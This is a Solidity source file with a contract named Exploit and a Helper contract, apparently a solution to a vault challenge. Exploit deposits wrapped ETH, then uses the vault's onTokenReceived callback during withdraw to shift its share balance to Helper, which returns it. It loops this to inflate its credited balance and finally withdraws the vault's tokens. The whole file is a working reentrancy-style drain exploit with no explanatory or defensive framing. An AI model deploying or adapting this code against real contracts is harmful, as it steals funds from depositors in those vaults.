pragma solidity 0.8.28;

interface IVault {
    function token() external view returns (address);
    function deposit(uint) external;
    function withdraw(uint) external;
    function transfer(address, uint) external;
    function balanceOf(address) external view returns (uint);
}

interface IToken {
    function wrap() external payable;
    function approve(address, uint) external returns (bool);
    function balanceOf(address) external view returns (uint);
}

contract Helper {
    IVault vault;
    address owner;
    constructor(address v) { vault = IVault(v); owner = msg.sender; }
    function back() external {
        vault.transfer(owner, vault.balanceOf(address(this)));
    }
}

contract Exploit {
    IVault vault;
    IToken token;
    Helper helper;
    bool mode;

    constructor(address target) payable {
        vault = IVault(target);
        token = IToken(vault.token());
        helper = new Helper(target);
        token.wrap{value: msg.value}();
        token.approve(target, type(uint).max);
        vault.deposit(msg.value);
    }

    function onTokenReceived(address, uint amount) external {
        if (mode) {
            mode = false;
            vault.transfer(address(helper), amount);
        }
    }

    function run() external {
        for (uint i = 0; i < 4; i++) {
            uint c = vault.balanceOf(address(this));
            mode = true;
            vault.withdraw(c);
            vault.deposit(c);
            helper.back();
        }
        uint bal = token.balanceOf(address(vault));
        uint cred = vault.balanceOf(address(this));
        vault.withdraw(bal < cred ? bal : cred);
    }
}
